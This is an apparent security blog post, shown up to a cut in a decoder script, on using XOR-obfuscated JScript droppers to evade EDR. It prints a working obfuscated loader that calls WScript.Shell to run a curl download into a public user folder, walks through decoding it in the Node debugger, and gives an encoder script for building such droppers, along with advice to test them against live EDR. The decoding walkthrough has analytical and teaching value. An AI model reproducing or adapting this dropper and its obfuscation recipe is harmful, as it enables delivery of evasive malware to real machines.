# https://g3tsyst3m.com/edr%20bypass/Malware-EDR-Evasion-Techniques/

<!DOCTYPE html><!--
  Minimal Mistakes Jekyll Theme 4.24.0 by Michael Rose
  Copyright 2013-2020 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
--><html lang="en" class=" js ">

  <body class="layout--single wide">
    

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      
    </div>
  </div>
</div>


    <div class="initial-content">
      





<div id="main" role="main">
  
  



  <article class="page h-entry" itemscope="" itemtype="https://schema.org/CreativeWork">
    
    
    
    

    <div class="page__inner-wrap">
      
        
      

      <section class="page__content e-content" itemprop="text">
        
        <p>Yo, how‚Äôs it going everyone.  Sorry it‚Äôs been a while since my last post.  Fear not, I‚Äôm geared up and ready to dive in to a full discussion on Malware evasive maneuvers‚Ä¶specifically, <code class="language-plaintext highlighter-rouge">.js</code> files for the first drops on a machine.  Oh and yes, you‚Äôre reading that correctly.  I said .js, because believe it or not it is still actively used and HIGHLY effective at bypassing your most common EDR solutions today.  Why is that?  Well, it‚Äôs likely due to a few reasons:</p>

<ul>
  <li>Living off the land binaries</li>
  <li>Improved obfuscation techniques</li>
  <li>.js scripts just aren‚Äôt as heavily scrutinized by EDR like an .exe or .ps1 would be.</li>
  <li>The methods used within the scripts themselves.  A lot of various methods can be implemented to avoid AV triggers, such as the binary you use to download your payloads and exfiltrate information</li>
</ul>

<p>okay, so here‚Äôs the malware specimen.  This is a rough representation of the malware I recently analyzed but in this case, I added some of my own methods of obfuscation and encoding techniques, most of them fairly well known.  We have variable names scrambled, strings XOR‚Äôed, and so on.  This accomplishes a few things, namely ease of execution without triggering AV/EDR, depending on the techniques used within the <code class="language-plaintext highlighter-rouge">.js</code> script.  I use living off the land techniques to download additional payloads within the script.  You must be cautious at this point in your script.  EDR solutions are well familiar with BITSADMIN, certutil, powershell iex, etc.  I always test my scripts against live EDR solutions to ensure the techniques used within the script are able to successfully bypass EDR; at least until folks start submitting them to virustotal üòÖ  You will get to see the LOTL tool I use to download a secondary file once we decode the below code:</p>

<h2 id="the-obfuscated-code"><strong><em>The Obfuscated Code</em></strong><a class="header-link" href="https://g3tsyst3m.com/edr%20bypass/Malware-EDR-Evasion-Techniques/#the-obfuscated-code" title="Permalink"><span class="sr-only">Permalink</span><i class="fas fa-link"></i></a></h2>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
    <span class="kd">var</span> <span class="nx">fsh35h35h35h353h5r</span> <span class="o">=</span> <span class="p">[];</span>
		<span class="kd">var</span> <span class="nx">njgpwoeotgoo7u3upo35h5bho</span> <span class="o">=</span> <span class="p">[];</span>
		<span class="kd">var</span> <span class="nx">llgll325h3l5l4</span> <span class="o">=</span> <span class="p">[];</span>
		<span class="kd">var</span> <span class="nx">vffvfvrt9bvwetr8bwrt8bwrb8w</span> <span class="o">=</span> <span class="p">[];</span>
    <span class="kd">var</span> <span class="nx">vcg35b53hg53gh</span> <span class="o">=</span> <span class="p">[</span><span class="mi">43</span><span class="p">,</span><span class="mi">61</span><span class="p">,</span><span class="mi">58</span><span class="p">,</span><span class="mi">36</span><span class="p">,</span><span class="mi">104</span><span class="p">,</span><span class="mi">101</span><span class="p">,</span><span class="mi">35</span><span class="p">,</span><span class="mi">104</span><span class="p">,</span><span class="mi">101</span><span class="p">,</span><span class="mi">46</span><span class="p">,</span><span class="mi">104</span><span class="p">,</span><span class="mi">101</span><span class="p">,</span><span class="mi">59</span><span class="p">,</span><span class="mi">104</span><span class="p">,</span><span class="mi">101</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">104</span><span class="p">];</span> 
		<span class="kd">var</span> <span class="nx">hhghj46j46</span> <span class="o">=</span> <span class="p">[</span><span class="mi">104</span><span class="p">,</span><span class="mi">101</span><span class="p">,</span><span class="mi">39</span><span class="p">,</span><span class="mi">104</span><span class="p">,</span><span class="mi">43</span><span class="p">,</span><span class="mi">114</span><span class="p">,</span><span class="mi">103</span><span class="p">,</span><span class="mi">61</span><span class="p">,</span><span class="mi">59</span><span class="p">,</span><span class="mi">45</span><span class="p">,</span><span class="mi">58</span><span class="p">,</span><span class="mi">59</span><span class="p">,</span><span class="mi">103</span><span class="p">,</span><span class="mi">56</span><span class="p">,</span><span class="mi">61</span><span class="p">,</span><span class="mi">42</span><span class="p">,</span><span class="mi">36</span><span class="p">,</span><span class="mi">33</span><span class="p">,</span><span class="mi">43</span><span class="p">,</span><span class="mi">103</span><span class="p">,</span><span class="mi">60</span><span class="p">,</span><span class="mi">32</span><span class="p">,</span><span class="mi">45</span><span class="p">,</span><span class="mi">44</span><span class="p">,</span><span class="mi">58</span><span class="p">,</span><span class="mi">39</span><span class="p">,</span><span class="mi">56</span><span class="p">,</span><span class="mi">56</span><span class="p">,</span><span class="mi">45</span><span class="p">,</span><span class="mi">44</span><span class="p">,</span><span class="mi">46</span><span class="p">,</span><span class="mi">33</span><span class="p">,</span><span class="mi">36</span><span class="p">,</span><span class="mi">45</span><span class="p">];</span>
		<span class="kd">var</span> <span class="nx">b33h3h354f3</span> <span class="o">=</span>  <span class="p">[</span><span class="mi">32</span><span class="p">,</span><span class="mi">60</span><span class="p">,</span><span class="mi">60</span><span class="p">,</span><span class="mi">56</span><span class="p">,</span><span class="mi">59</span><span class="p">,</span><span class="mi">114</span><span class="p">,</span><span class="mi">103</span><span class="p">,</span><span class="mi">103</span><span class="p">,</span><span class="mi">58</span><span class="p">,</span><span class="mi">41</span><span class="p">,</span><span class="mi">63</span><span class="p">,</span><span class="mi">102</span><span class="p">,</span><span class="mi">47</span><span class="p">,</span><span class="mi">33</span><span class="p">,</span><span class="mi">60</span><span class="p">,</span><span class="mi">32</span><span class="p">,</span><span class="mi">61</span><span class="p">,</span><span class="mi">42</span><span class="p">,</span><span class="mi">61</span><span class="p">,</span><span class="mi">59</span><span class="p">,</span><span class="mi">45</span><span class="p">,</span><span class="mi">58</span><span class="p">,</span><span class="mi">43</span><span class="p">,</span><span class="mi">39</span><span class="p">,</span><span class="mi">38</span><span class="p">,</span><span class="mi">60</span><span class="p">,</span><span class="mi">45</span><span class="p">,</span><span class="mi">38</span><span class="p">,</span><span class="mi">60</span><span class="p">,</span><span class="mi">102</span><span class="p">,</span><span class="mi">43</span><span class="p">,</span><span class="mi">39</span><span class="p">,</span><span class="mi">37</span><span class="p">,</span><span class="mi">103</span><span class="p">,</span><span class="mi">47</span><span class="p">,</span><span class="mi">123</span><span class="p">,</span><span class="mi">60</span><span class="p">,</span><span class="mi">59</span><span class="p">,</span><span class="mi">49</span><span class="p">,</span><span class="mi">59</span><span class="p">,</span><span class="mi">60</span><span class="p">,</span><span class="mi">123</span><span class="p">,</span><span class="mi">37</span><span class="p">,</span><span class="mi">103</span><span class="p">,</span><span class="mi">45</span><span class="p">,</span><span class="mi">36</span><span class="p">,</span><span class="mi">45</span><span class="p">,</span><span class="mi">62</span><span class="p">,</span><span class="mi">41</span><span class="p">,</span><span class="mi">60</span><span class="p">,</span><span class="mi">33</span><span class="p">,</span><span class="mi">39</span><span class="p">,</span><span class="mi">38</span><span class="p">,</span><span class="mi">59</span><span class="p">,</span><span class="mi">60</span><span class="p">,</span><span class="mi">41</span><span class="p">,</span><span class="mi">60</span><span class="p">,</span><span class="mi">33</span><span class="p">,</span><span class="mi">39</span><span class="p">,</span><span class="mi">38</span><span class="p">,</span><span class="mi">103</span><span class="p">,</span><span class="mi">37</span><span class="p">,</span><span class="mi">41</span><span class="p">,</span><span class="mi">33</span><span class="p">,</span><span class="mi">38</span><span class="p">,</span><span class="mi">103</span><span class="p">,</span><span class="mi">45</span><span class="p">,</span><span class="mi">36</span><span class="p">,</span><span class="mi">45</span><span class="p">,</span><span class="mi">62</span><span class="p">,</span><span class="mi">41</span><span class="p">,</span><span class="mi">60</span><span class="p">,</span><span class="mi">33</span><span class="p">,</span><span class="mi">39</span><span class="p">,</span><span class="mi">38</span><span class="p">,</span><span class="mi">59</span><span class="p">,</span><span class="mi">60</span><span class="p">,</span><span class="mi">41</span><span class="p">,</span><span class="mi">60</span><span class="p">,</span><span class="mi">33</span><span class="p">,</span><span class="mi">39</span><span class="p">,</span><span class="mi">38</span><span class="p">,</span><span class="mi">103</span><span class="p">,</span><span class="mi">45</span><span class="p">,</span><span class="mi">36</span><span class="p">,</span><span class="mi">45</span><span class="p">,</span><span class="mi">62</span><span class="p">,</span><span class="mi">41</span><span class="p">,</span><span class="mi">60</span><span class="p">,</span><span class="mi">33</span><span class="p">,</span><span class="mi">39</span><span class="p">,</span><span class="mi">38</span><span class="p">,</span><span class="mi">59</span><span class="p">,</span><span class="mi">60</span><span class="p">,</span><span class="mi">41</span><span class="p">,</span><span class="mi">60</span><span class="p">,</span><span class="mi">33</span><span class="p">,</span><span class="mi">39</span><span class="p">,</span><span class="mi">38</span><span class="p">,</span><span class="mi">102</span><span class="p">,</span><span class="mi">43</span><span class="p">,</span><span class="mi">56</span><span class="p">,</span><span class="mi">56</span><span class="p">];</span>
		<span class="kd">var</span> <span class="nx">nn7unj4n465j</span><span class="o">=</span><span class="nx">vcg35b53hg53gh</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span>
		<span class="kd">var</span> <span class="nx">b46n354j3547</span><span class="o">=</span><span class="nx">hhghj46j46</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span>
		<span class="kd">var</span> <span class="nx">drygh64uj</span><span class="o">=</span><span class="nx">b33h3h354f3</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span>
		
    <span class="kd">var</span> <span class="nx">n86k468534</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ActiveXObject</span><span class="p">(</span><span class="dl">'</span><span class="s1">WScript.Shell</span><span class="dl">'</span><span class="p">);</span>
		<span class="k">for </span><span class="p">(</span><span class="nx">a</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nx">a</span><span class="o">&lt;</span><span class="nx">nn7unj4n465j</span><span class="p">;</span><span class="nx">a</span><span class="o">++</span><span class="p">)</span>
		<span class="p">{</span>
		<span class="nx">fsh35h35h35h353h5r</span><span class="p">[</span><span class="nx">a</span><span class="p">]</span><span class="o">=</span><span class="nb">String</span><span class="p">.</span><span class="nf">fromCharCode</span><span class="p">(</span><span class="nx">vcg35b53hg53gh</span><span class="p">[</span><span class="nx">a</span><span class="p">]</span> <span class="o">^</span> <span class="mi">72</span><span class="p">);</span>
		<span class="p">}</span>
		<span class="k">for </span><span class="p">(</span><span class="nx">a</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nx">a</span><span class="o">&lt;</span><span class="nx">b46n354j3547</span><span class="p">;</span><span class="nx">a</span><span class="o">++</span><span class="p">)</span>
		<span class="p">{</span>
		<span class="nx">llgll325h3l5l4</span><span class="p">[</span><span class="nx">a</span><span class="p">]</span><span class="o">=</span><span class="nb">String</span><span class="p">.</span><span class="nf">fromCharCode</span><span class="p">(</span><span class="nx">hhghj46j46</span><span class="p">[</span><span class="nx">a</span><span class="p">]</span> <span class="o">^</span> <span class="mi">72</span><span class="p">);</span>
		<span class="p">}</span>
		<span class="k">for </span><span class="p">(</span><span class="nx">a</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nx">a</span><span class="o">&lt;</span><span class="nx">drygh64uj</span><span class="p">;</span><span class="nx">a</span><span class="o">++</span><span class="p">)</span>
		<span class="p">{</span>
		<span class="nx">vffvfvrt9bvwetr8bwrt8bwrb8w</span><span class="p">[</span><span class="nx">a</span><span class="p">]</span><span class="o">=</span><span class="nb">String</span><span class="p">.</span><span class="nf">fromCharCode</span><span class="p">(</span><span class="nx">b33h3h354f3</span><span class="p">[</span><span class="nx">a</span><span class="p">]</span> <span class="o">^</span> <span class="mi">72</span><span class="p">);</span>
		<span class="p">}</span>
		
		<span class="nx">bnnbn6hn64jn46j4n3jn4</span><span class="o">=</span><span class="nx">fsh35h35h35h353h5r</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="dl">""</span><span class="p">);</span>
		<span class="nx">qswfg3yh35h35</span><span class="o">=</span><span class="nx">llgll325h3l5l4</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="dl">""</span><span class="p">);</span>
		<span class="nx">njgpwoeotgoo7u3upo35h5bho</span><span class="o">=</span><span class="nx">vffvfvrt9bvwetr8bwrt8bwrb8w</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="dl">""</span><span class="p">);</span>
		
		<span class="nx">n86k468534</span><span class="p">.</span><span class="nc">Run</span><span class="p">(</span><span class="nx">bnnbn6hn64jn46j4n3jn4</span><span class="o">+</span><span class="nx">njgpwoeotgoo7u3upo35h5bho</span><span class="o">+</span><span class="nx">qswfg3yh35h35</span><span class="p">);</span>
</code></pre></div></div>

<p>How can we detonate this safely?  well, first of all we will want to comment out some lines so our debugging session cooperates nicely!  I will show you how to do that now.</p>

<p>For starters, make sure you have Node.js installed: <a href="https://nodejs.org/">grab Node using this link</a></p>

<p>next, we need to comment out this line in the above code:</p>

<p><code class="language-plaintext highlighter-rouge">//var n86k468534 = new ActiveXObject('WScript.Shell');</code></p>

<p>and comment out  this line:</p>

<p><code class="language-plaintext highlighter-rouge">//n86k468534.Run(bnnbn6hn64jn46j4n3jn4+njgpwoeotgoo7u3upo35h5bho+qswfg3yh35h35);</code></p>

<p>The reason for this prepwork is due to Node‚Äôs incompatibility with ActiveXObjects, at least natively.  We want to avoid throwing errors as much as possible while debugging.</p>

<p>okay, now fire up cmd.exe and enter the following command: <strong>node inspect [js script]</strong></p>

<p>here‚Äôs how it looks on my end:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\temp\ourjsfiles&gt;node inspect obfuscated.js
&lt; Debugger
&lt; listening on ws://127.0.0.1:9229/a8460333-5031-4d4e-8b46-e0cb41fe28cd
&lt; For help, see: https://nodejs.org/en/docs/inspector
&lt; Debugger attached.
Break on start in obfuscated.js:1
&gt; 1             var fsh35h35h35h353h5r = [];
  2             var njgpwoeotgoo7u3upo35h5bho = [];
  3             var llgll325h3l5l4 = [];
debug&gt;
</code></pre></div></div>

<p>we want to hit ‚Äò<strong>n</strong>‚Äô to go line by line until we find a variable we want to watch to see what values are set by the variable as we see fit.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>debug&gt; n
break in obfuscated.js:3
  1             var fsh35h35h35h353h5r = [];
  2             var njgpwoeotgoo7u3upo35h5bho = [];
&gt; 3             var llgll325h3l5l4 = [];
  4             var vffvfvrt9bvwetr8bwrt8bwrb8w = [];
  5         var vcg35b53hg53gh = [43,61,58,36,104,101,35,104,101,46,104,101,59,104,101,4,104];
debug&gt; n
break in obfuscated.js:4
  2             var njgpwoeotgoo7u3upo35h5bho = [];
  3             var llgll325h3l5l4 = [];
&gt; 4             var vffvfvrt9bvwetr8bwrt8bwrb8w = [];
  5         var vcg35b53hg53gh = [43,61,58,36,104,101,35,104,101,46,104,101,59,104,101,4,104];
  6             var hhghj46j46 = [104,101,39,104,43,114,103,61,59,45,58,59,103,56,61,42,36,33,43,103,60,32,45,44,58,39,56,56,45,44,46,33,36,45];
debug&gt; n
break in obfuscated.js:5
  3             var llgll325h3l5l4 = [];
  4             var vffvfvrt9bvwetr8bwrt8bwrb8w = [];
&gt; 5         var vcg35b53hg53gh = [43,61,58,36,104,101,35,104,101,46,104,101,59,104,101,4,104];
  6             var hhghj46j46 = [104,101,39,104,43,114,103,61,59,45,58,59,103,56,61,42,36,33,43,103,60,32,45,44,58,39,56,56,45,44,46,33,36,45];
  7             var b33h3h354f3 =  [32,60,60,56,59,114,103,103,58,41,63,102,47,33,60,32,61,42,61,59,45,58,43,39,38,60,45,38,60,102,43,39,37,103,47,123,60,59,49,59,60,123,37,103,45,36,45,62,41,60,33,39,38,59,60,41,60,33,39,38,103,37,41,33,38,103,45,36,45,62,41,60,33,39,38,59,60,41,60,33,39,38,103,45,36,45,62,41,60,33,39,38,59,60,41,60,33,39,38,102,43,56,56];
debug&gt; watch("fsh35h35h35h353h5r") &lt;-- I want to watch this variable since it's not populated yet
debug&gt; watch("njgpwoeotgoo7u3upo35h5bho")     &lt;-- I want to watch this variable since it's not populated yet
debug&gt; watch("llgll325h3l5l4")    &lt;-- I want to watch this variable since it's not populated yet
debug&gt; watch("vffvfvrt9bvwetr8bwrt8bwrb8w")    &lt;-- I want to watch this variable since it's not populated yet
debug&gt;
</code></pre></div></div>

<p>You can type <code class="language-plaintext highlighter-rouge">watchers</code> to see your watched values populate in real time:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>debug&gt; watchers
  debug&gt; watchers
  0: fsh35h35h35h353h5r = [  ]
  1: njgpwoeotgoo7u3upo35h5bho = [  ]
  2: llgll325h3l5l4 = [  ]
  3: vffvfvrt9bvwetr8bwrt8bwrb8w = undefined
</code></pre></div></div>

<p>hit <code class="language-plaintext highlighter-rouge">'n'</code> and then hit <code class="language-plaintext highlighter-rouge">[enter]</code> a few times to continue line by line until we hit the for loop.</p>

<p>We can see this for loop is doing a decode routine.  it‚Äôs using the <code class="language-plaintext highlighter-rouge">^</code> character which is used for XOR bitwise operations.  So, this is decoding a previously encoded string!
Hit <code class="language-plaintext highlighter-rouge">[enter]</code> until you start to see your 1st watchers value update, and you cycle through your first for loop:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Watchers:
  0: fsh35h35h35h353h5r = [ 'c', 'u', 'r', 'l' ] &lt;-- we found something!!!  let's keep going...
  1: njgpwoeotgoo7u3upo35h5bho = [  ]
  2: llgll325h3l5l4 = [  ]
  3: vffvfvrt9bvwetr8bwrt8bwrb8w = [  ]

 11
 12         //var n86k468534 = new ActiveXObject('WScript.Shell');
&gt;13             for (a=0;a&lt;nn7unj4n465j;a++)
 14             {
 15             fsh35h35h35h353h5r[a]=String.fromCharCode(vcg35b53hg53gh[a] ^ 72);
debug&gt;
</code></pre></div></div>

<p>okay, I don‚Äôt want you to have to keep hitting <code class="language-plaintext highlighter-rouge">[enter]</code> over and over again, so let‚Äôs set a breakpoint on the next two for loops and the first ‚Äújoin‚Äù command, shall we?</p>

<p><strong>debug&gt; sb(‚Äúobfuscated.js‚Äù,17)</strong></p>

<p><strong>debug&gt; sb(‚Äúobfuscated.js‚Äù,21)</strong></p>

<p><strong>debug&gt; sb(‚Äúobfuscated.js‚Äù,26)</strong></p>

<p>now, all we have to do is hit <code class="language-plaintext highlighter-rouge">'c'</code> to continue debugging until the next breakpoint and we don‚Äôt have to hit enter through each for loop.  Plus, setting a breakpoint after the for loop helps us find a good pause point to review our watchers values.  I wonder what surprises await us?! üò∏</p>

<p>hit <code class="language-plaintext highlighter-rouge">'c'</code> until you are on line 26:</p>

<blockquote>
  <p>26             bnnbn6hn64jn46j4n3jn4=fsh35h35h35h353h5r.join(‚Äú‚Äù);</p>
</blockquote>

<p>then type in <code class="language-plaintext highlighter-rouge">watchers</code>. you should see the following, in an ugly vertical format:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>fsh35h35h35h353h5r =
    [ 'c',
      'u',
      'r',
      'l',
      ' ',
      '-',
      'k',
      ' ',
      '-',
      'f',
      ' ',
      '-',
      's',
      ' ',
      '-',
      'L',
      ' ' ]
</code></pre></div></div>

<p>formatted, that would be: <strong>curl -k -f -s -L</strong></p>

<p>so it seems we are using a living off the land binary!</p>

<p>don‚Äôt worry, the nasty formatting cleans up later üòÑ  okay, set another breakpoint on line 29, like so:</p>

<p><strong>debug&gt; sb(‚Äúobfuscated.js‚Äù,29)</strong></p>

<p>now, you should see three new variables, we need the final values of those, so let‚Äôs watch them, and unwatch the other three we set earlier:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>unwatch("fsh35h35h35h353h5r")
unwatch("llgll325h3l5l4")
unwatch("vffvfvrt9bvwetr8bwrt8bwrb8w")

watch("bnnbn6hn64jn46j4n3jn4")
watch("qswfg3yh35h35")
</code></pre></div></div>

<p>then, type <code class="language-plaintext highlighter-rouge">watchers</code> again, and prepare to be amazed!  It‚Äôs all three variables fully spelled out now!</p>

<p>the reason for this is that the for loop was obviously incrementing character by character and that‚Äôs why it was displayed in that nasty vertifical format.</p>

<p>however, now, we have three new variables that cleanly join each variable array together and clean everything up nicely as you can now see:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>debug&gt; watchers
  0: bnnbn6hn64jn46j4n3jn4 = 'curl -k -f -s -L '
  1: njgpwoeotgoo7u3upo35h5bho = 'https://raw.githubusercontent.com/g3tsyst3m/elevationstation/main/elevationstation/elevationstation.cpp'
  2: qswfg3yh35h35 = ' -o c:/users/public/thedroppedfile'
</code></pre></div></div>

<p>And there you have it!  We successfully debugged the obfuscated AND decoded that nasty .js malware sample statically, without actually executing the link.  Good news is, it‚Äôs harmless as this is just an exercise and it would have downloaded my elevationstation.cpp file to your public users directory.</p>

<h2 id="the-encoding-routine"><strong><em>The Encoding Routine</em></strong><a class="header-link" href="https://g3tsyst3m.com/edr%20bypass/Malware-EDR-Evasion-Techniques/#the-encoding-routine" title="Permalink"><span class="sr-only">Permalink</span><i class="fas fa-link"></i></a></h2>

<p>So, how would a hacker go about making one of these nasty scripts?  It‚Äôs fairly trivial if you know basic javascript if I‚Äôm being honest.  I could have simplfied this by only using one variable instead of three for the strings, but splitting up the variable strings adds further obfuscation to your code:</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">//encoder.js</span>
		<span class="kd">var</span> <span class="nx">encodedURI</span> <span class="o">=</span> <span class="p">[];</span>
		<span class="kd">var</span> <span class="nx">encoded</span> <span class="o">=</span> <span class="p">[];</span>
		<span class="kd">var</span> <span class="nx">ccc</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">curl -k -f -s -L </span><span class="dl">"</span><span class="p">;</span>
		<span class="kd">var</span> <span class="nx">lastccc</span><span class="o">=</span><span class="dl">"</span><span class="s2"> -o c:/users/public/thedroppedfile</span><span class="dl">"</span><span class="p">;</span>
		<span class="kd">var</span> <span class="nx">thelink</span><span class="o">=</span><span class="dl">"</span><span class="s2">https://raw.githubusercontent.com/g3tsyst3m/elevationstation/main/elevationstation/elevationstation.cpp</span><span class="dl">"</span><span class="p">;</span> <span class="o">&lt;--</span> <span class="nx">file</span> <span class="nx">we</span> <span class="nx">want</span> <span class="nx">to</span> <span class="nx">download</span> <span class="nx">to</span> <span class="nx">the</span> <span class="dl">'</span><span class="s1">victim</span><span class="dl">'</span>
		<span class="kd">var</span> <span class="nx">sizeof1</span><span class="o">=</span><span class="nx">ccc</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span>
		<span class="kd">var</span> <span class="nx">sizeof2</span><span class="o">=</span><span class="nx">lastccc</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span>
		<span class="kd">var</span> <span class="nx">sizeof3</span><span class="o">=</span><span class="nx">thelink</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span>
		<span class="k">for </span><span class="p">(</span><span class="nx">a</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nx">a</span><span class="o">&lt;</span><span class="nx">sizeof1</span><span class="p">;</span><span class="nx">a</span><span class="o">++</span><span class="p">)</span>
		<span class="p">{</span>
		<span class="nx">encoded</span><span class="p">[</span><span class="nx">a</span><span class="p">]</span><span class="o">=</span><span class="nx">ccc</span><span class="p">.</span><span class="nf">charCodeAt</span><span class="p">(</span><span class="nx">a</span><span class="p">)</span> <span class="o">^</span> <span class="mi">72</span><span class="p">;</span> <span class="o">&lt;--</span> <span class="nx">XOR</span> <span class="nx">encoding</span> <span class="nx">using</span> <span class="nx">the</span> <span class="nx">decimal</span> <span class="nx">value</span> <span class="dl">'</span><span class="s1">72</span><span class="dl">'</span> 
		<span class="p">}</span>
		<span class="nx">WScript</span><span class="p">.</span><span class="nc">Echo</span><span class="p">(</span><span class="dl">"</span><span class="s2">curl encoded: </span><span class="dl">"</span> <span class="o">+</span> <span class="nx">encoded</span><span class="p">);</span>
		<span class="k">for </span><span class="p">(</span><span class="nx">a</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nx">a</span><span class="o">&lt;</span><span class="nx">sizeof2</span><span class="p">;</span><span class="nx">a</span><span class="o">++</span><span class="p">)</span>
		<span class="p">{</span>
		<span class="nx">encoded</span><span class="p">[</span><span class="nx">a</span><span class="p">]</span><span class="o">=</span><span class="nx">lastccc</span><span class="p">.</span><span class="nf">charCodeAt</span><span class="p">(</span><span class="nx">a</span><span class="p">)</span> <span class="o">^</span> <span class="mi">72</span><span class="p">;</span> <span class="o">&lt;--</span> <span class="nx">XOR</span> <span class="nx">encoding</span> <span class="nx">using</span> <span class="nx">the</span> <span class="nx">decimal</span> <span class="nx">value</span> <span class="dl">'</span><span class="s1">72</span><span class="dl">'</span> 
		<span class="p">}</span>
		<span class="nx">WScript</span><span class="p">.</span><span class="nc">Echo</span><span class="p">(</span><span class="dl">"</span><span class="s2">last part of curl encoded: </span><span class="dl">"</span> <span class="o">+</span> <span class="nx">encoded</span><span class="p">);</span>
		<span class="k">for </span><span class="p">(</span><span class="nx">a</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nx">a</span><span class="o">&lt;</span><span class="nx">sizeof3</span><span class="p">;</span><span class="nx">a</span><span class="o">++</span><span class="p">)</span>
		<span class="p">{</span>
		<span class="nx">encodedURI</span><span class="p">[</span><span class="nx">a</span><span class="p">]</span><span class="o">=</span><span class="nx">thelink</span><span class="p">.</span><span class="nf">charCodeAt</span><span class="p">(</span><span class="nx">a</span><span class="p">)</span> <span class="o">^</span> <span class="mi">72</span><span class="p">;</span> <span class="o">&lt;--</span> <span class="nx">XOR</span> <span class="nx">encoding</span> <span class="nx">using</span> <span class="nx">the</span> <span class="nx">decimal</span> <span class="nx">value</span> <span class="dl">'</span><span class="s1">72</span><span class="dl">'</span> 
		<span class="p">}</span>
		<span class="c1">//finalURI="%"+encodedURI.join("%");</span>
		<span class="nx">WScript</span><span class="p">.</span><span class="nc">Echo</span><span class="p">(</span><span class="dl">"</span><span class="s2">The URL encoded: </span><span class="dl">"</span><span class="o">+</span><span class="nx">encodedURI</span><span class="p">);</span>
</code></pre></div></div>

<p>Let‚Äôs run it‚Ä¶ üòú</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\temp\ourjsfiles&gt;cscript encoder.js
Microsoft (R) Windows Script Host Version 5.812
Copyright (C) Microsoft Corporation. All rights reserved.

curl encoded: 43,61,58,36,104,101,35,104,101,46,104,101,59,104,101,4,104
last part of curl encoded: 104,101,39,104,43,114,103,61,59,45,58,59,103,56,61,42,36,33,43,103,60,32,45,44,58,39,56,56,45,44,46,33,36,45
The URL encoded: 32,60,60,56,59,114,103,103,58,41,63,102,47,33,60,32,61,42,61,59,45,58,43,39,38,60,45,38,60,102,43,39,37,103,47,123,60,59,49,59,60,123,37,103,45,36,45,62,41,60,33,39,38,59,60,41,60,33,39,38,103,37,41,33,38,103,45,36,45,62,41,60,33,39,38,59,60,41,60,33,39,38,103,45,36,45,62,41,60,33,39,38,59,60,41,60,33,39,38,102,43,56,56
</code></pre></div></div>

<p>so, we have our xor encoded values.  Let‚Äôs add them to our decode routine.</p>

<h2 id="the-decoding-routine"><strong><em>The Decoding Routine</em></strong><a class="header-link" href="https://g3tsyst3m.com/edr%20bypass/Malware-EDR-Evasion-Techniques/#the-decoding-routine" title="Permalink"><span class="sr-only">Permalink</span><i class="fas fa-link"></i></a></h2>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">//decoder.js</span>
<span class="kd">var</span> <span class="nx">decoded1</span> <span class="o">=</span> <span class="p">[];</span>
<span class="kd">var</span> <span class="nx">linkURI</span> <span class="o">=</span> <span class="p">[];</span>
<span class="kd">var</span> <span class="nx">decoded2</span> <span class="o">=</span> <span class="p">[];</span>
<span class="kd">var</span> <span class="nx">decodedURI</span> <span class="o">=</span> <span class="p">[];</span>
<span class="kd">var</span> <span class="nx">encoded1</span> <span class="o">=</span> <span class="p">[</span><span class="mi">43</span><span class="p">,</span><span class="mi">61</span><span class="p">,</span><span class="mi">58</span><span class="p">,</span><span class="mi">36</span><span class="p">,</span><span class="mi">104</span><span class="p">,</span><span class="mi">101</span><span class="p">,</span><span class="mi">35</span><span class="p">,</span><span class="mi">104</span><span class="p">,</span><span class="mi">101</span><span class="p">,</span><span class="mi">46</span><span class="p">,</span><span class="mi">104</span><span class="p">,</span><span class="mi">101</span><span class="p">,</span><span class="mi">59</span><span class="p">,</span><span class="mi">104</span><span class="p">,</span><span class="mi">101</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">104</span><span class="p">];</span> 
